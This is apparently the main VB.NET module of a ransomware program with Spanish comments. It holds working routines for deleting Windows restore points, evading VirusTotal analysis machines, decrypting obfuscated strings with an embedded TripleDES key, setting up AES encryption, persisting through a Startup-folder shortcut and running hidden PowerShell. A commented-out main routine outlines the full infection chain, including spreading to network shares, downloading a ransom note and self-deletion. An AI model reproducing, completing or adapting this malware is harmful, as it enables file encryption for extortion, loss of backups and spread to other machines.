#Region "Imports"

Imports System.Management
Imports System.Threading
Imports System.Text
Imports System.IO
Imports System.Security.Cryptography
Imports System.Runtime.InteropServices

#End Region

Module mMain

#Region "APIs"

    Declare Auto Function NoPoints Lib "Srclient.dll" Alias "SRRemoveRestorePoint" (ByVal index As Integer) As Integer

#End Region

#Region "Constants"

    Private Const SW_NORMAL As Integer = 4

#End Region


#Region "Functions, Procedures"

    ' Addiciona backslash o diagonal al final de una ruta
    Public Function AddBackSlash(ByVal strPath As String) As String
        On Error Resume Next
        Dim Right As String
        Right = strPath.Substring(strPath.Length - 1)
        If Right <> "\" Then strPath = strPath.Trim & "\"
        Return strPath
    End Function

    ' Crea Clave o Password de X longitud, correspondiente al valor recibido como parametro
    Public Function CreatePass(ByVal Length As Integer) As String

        Dim cSBuilder As New StringBuilder
        Dim rnd As New Random
        Try
            Do While (Length > 0)
                cSBuilder.Append(clsS.sChar(rnd.Next(clsS.sChar.Length)))
                Length = Length - 1
            Loop
        Catch ex As Exception
        End Try
        Return (cSBuilder.ToString)
    End Function

    ' Elimina pu8ntos de restauración de Windows, requiere privilegios
    Private Sub DeleteRestorePoints()
        Try
            Dim objClass As New Management.ManagementClass("\\.\root\default", "systemrestore", New System.Management.ObjectGetOptions())
            Dim objCol As Management.ManagementObjectCollection = objClass.GetInstances()

            For Each objItem As Management.ManagementObject In objCol
                NoPoints(CUInt(objItem("sequencenumber")).ToString())
            Next
        Catch ex As Exception

        End Try
    End Sub

    ' Verifica el tañano en bytes del archivo recibido como paremetro
    Public Function CheckFileSize(ByVal sFilePath As String) As Long
        Try
            Dim oFileInfo As System.IO.FileInfo = My.Computer.FileSystem.GetFileInfo(sFilePath)
            Return oFileInfo.Length
        Catch ex As Exception
            Return "Error Reading File"
        End Try
    End Function

    ' Obtiene ID unica a partir del serial del disco duro + password aleatorio
    Public Function GetHwId() As String
        Dim hw As New clsHWInfo
        clsS.hdd = hw.GetVolumeSerial(Obf("eOvZpnlJ77c="))
        Dim hwid As String = Strings.UCase(hw.GetMD5Hash(clsS.hdd + CreatePass(24)))
        clsS.hdd = Strings.UCase(hw.GetMD5Hash(clsS.hdd))
        Return hwid
    End Function

    ' Genera un nombre aleatorio + una extensión aleatoria
    Function GetRandomName(Optional ByVal bShared = True) As String
        Try
            Randomize()
            Return clsS.sSharedName.ElementAt(Int(Rnd() * 5)) & clsS.sSharedExtension.ElementAt(Int(Rnd() * 3)) : Exit Function
        Catch ex As Exception
            Return clsS.sExe
        End Try
    End Function

    ' Obtiene la ruta de la carpeta especial recibida como parametro
    Public Function GetSpecialFolder(ByVal SpecialFolder As Environment.SpecialFolder) As String
        Dim sFolderPath As String
        sFolderPath = Environment.GetFolderPath(SpecialFolder) & vbCrLf
        Return AddBackSlash(sFolderPath)
    End Function

    ' Inicializa Objeto CryptoStream
    Public Function InitCS(ByVal ms As MemoryStream, ByVal FirtsKey As Byte(), ByVal SecondKey As Byte()) As CryptoStream
        InitCS = New CryptoStream(ms, InitRjdl(FirtsKey, SecondKey), CryptoStreamMode.Write)
        Return InitCS
    End Function

    ' Inicializa Clase Criptográfica
    Public Function InitRjdl(ByVal byt() As Byte, ByVal bytt() As Byte)
        Dim cspRijndael As New System.Security.Cryptography.RijndaelManaged
        Return clsS.cspRijndael.CreateEncryptor(byt, bytt)
    End Function

    ' Inicializa HASH
    Public Function InitSHA(ByVal bDataToHash As Byte()) As Byte()
        Dim cspHash512 As New System.Security.Cryptography.SHA512Managed
        Return cspHash512.ComputeHash((bDataToHash))
    End Function

    ' Crea Acceso directo en Menu de Inicio para mostrar Mensaje cada vez que inicie Windows
    Private Sub InstallThread(ByVal sTargetPath As String, ByVal iWindowStyle As Integer)

        Dim oShell As Object = CreateObject(Obf("qo3f6kSWGRizvphX25b4hn0r/qT4K+hj+krYNUDluks="))
        Dim oLink As Object
        Dim sShortCutname As String = System.Guid.NewGuid.ToString()
        Dim sShortCutPath As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
        Try
            oLink = oShell.CreateShortcut(IO.Path.Combine(sShortCutPath, sShortCutname & Obf("7GGt+pgsxdd/70YzgijR2g==")))
            With oLink
                .TargetPath = sTargetPath
                .WorkingDirectory = IO.Path.GetDirectoryName(sTargetPath)
                .WindowStyle = iWindowStyle
                .Save()
            End With
        Catch Ex As Exception

        End Try
    End Sub

    ' Verifica si se esta ejecutando en algunas maquinas usadas por la comunidad de seguridad de virustotal, Hardcoded
    Public Function IsSecurityMachine() As Boolean
        Try
            For Each SecurityMachine In clsS.sSecurityMachines
                If String.Equals(clsS.sMachineName, SecurityMachine) Or String.Equals(clsS.sUserName, "gruja") Then
                    Return True
                    Exit Function
                End If
            Next
        Catch ex As Exception
            Return False
        End Try
        Return False
    End Function


    Public Sub main()

        clsSearch.ScanDrives()
        '        ' Valida si equipo donde se ejecuta pertenece a la comunidad de seguridad
        '        If IsSecurityMachine() Then GoTo 1
        '        ' Evita ejecutar otra instancia
        '        If Not MutualExclusion(False) Then GoTo 2
        '        ' Verifica si maquina ya fue infectada
        '        If Not File.Exists(clsS.sInfo) Then

        '            ' Valida si hay conexión a internet, y hacia servidor
        '            If Not clsPhp.SendDataToServer() Then GoTo 1
        '            ' Establezco atributos de Oculto y solo lectura al ejecutable
        '            SetFileAttributes(clsS.sExe)
        '            ' Busqueda de todos los archivos a encriptar en todas las unidades de disco de la maquina
        '            clsSearch.ScanDrives()
        '            ' Busqueda de Carpetas compartidas de la maquina para crear copia del ejecutable
        '            clsNetwork.ScanNetwork()
        '            ' Borrado de los puntos de restauración de Windows
        '            'DeleteRestorePoints()
        '            ' Creacion del archivo Acceso Directo (LNK) para autoinicio con Windows 
        '            InstallThread(clsS.sInfo, SW_NORMAL)
        '            ' Ejecución de Comando PowerShell (Downloader que descarga archivo TXT de notificación del Ransomware)
        '            RunPS(clsS.sNotice)
        '        End If
        '        MsgBox("continua")
        '1:      MsgBox("error ")
        '        ' Ejecución de Comando PowerShell encargado de desaparecer el ejecutable, primero sobre escribiendo el archivo y luego eliminandolo
        '        'RunPS(clsS.sFade)
        '2:
        '        Application.Exit()

    End Sub

    ' Evita la ejecución de otra instancia mediante la creación de  mutex
    Private Function MutualExclusion(ByVal blNewInstance As Boolean) As Boolean
        Try
            clsS.oMutex = New Mutex(True, GetHwId, blNewInstance)
        Catch exep As Exception
        End Try
        Return blNewInstance
    End Function

    ' Funcion para la encriptación de todas las cadenas usando cifrado TripleDes
    Public Function Obf(ByVal sToDecrypt As String) As String

        Dim Wrapper As New cls3DES(Encoding.UTF8.GetString(Convert.FromBase64String("JGowSm9AJTJvMk8mbkMwVjc5b0cyRWlnaHQ=")))

        Try
            Dim sCipherString As String = Wrapper.DecryptData(sToDecrypt)
            Obf = sCipherString
            Return (sCipherString)
        Catch ex As System.Security.Cryptography.CryptographicException
            Return (sToDecrypt)
        End Try
    End Function

    ' Rutina para ejecutar comandos PowerShell
    Public Sub RunPS(ByVal PS As String)
        Try
            Process.Start(New ProcessStartInfo() With {
                   .FileName = Obf("1I04sbsjCEHhDfEOigLE4xfz07slVs5Xy0ETzZPTOrc="),
                   .Arguments = PS,
                   .CreateNoWindow = True,
                   .ErrorDialog = False,
                   .WindowStyle = ProcessWindowStyle.Hidden
                   })
            Application.Exit()
        Catch ex As Exception
        End Try
    End Sub

    ' Establece atributos de oculto y solo lectura la archivo recibido como parametro
    Private Sub SetFileAttributes(ByVal sPath As String)
        Try
            File.SetAttributes(sPath, FileAttributes.ReadOnly Or FileAttributes.Hidden)
        Catch exUnathorized As UnauthorizedAccessException
            Debug.Print(Err.Description)
        End Try
    End Sub

    ' Clase para obtener el Serial del disco Duro
    Public Class clsHWInfo
        Friend Function GetVolumeSerial(Optional ByVal strDriveLetter As String = "C") As String

            Dim disk As ManagementObject = New ManagementObject(String.Format(clsS.sFormat, strDriveLetter))
            disk.Get()
            Return disk(Obf("OVXRZXwxZWS3Cl6WmqOD8gfrnCP31alVy3ozTBnsnsqg1jWk8TMxuQ==")).ToString()
        End Function
        Friend Function GetMD5Hash(ByVal strToHash As String) As String
            Dim md5Obj As New Security.Cryptography.MD5CryptoServiceProvider
            Dim bytesToHash() As Byte = System.Text.Encoding.ASCII.GetBytes(strToHash)

            bytesToHash = md5Obj.ComputeHash(bytesToHash)

            Dim strResult As String = ""

            For Each b As Byte In bytesToHash
                strResult += b.ToString(Obf("t7eldAKqPwU="))
            Next

            Return strResult
        End Function
    End Class

#End Region

End Module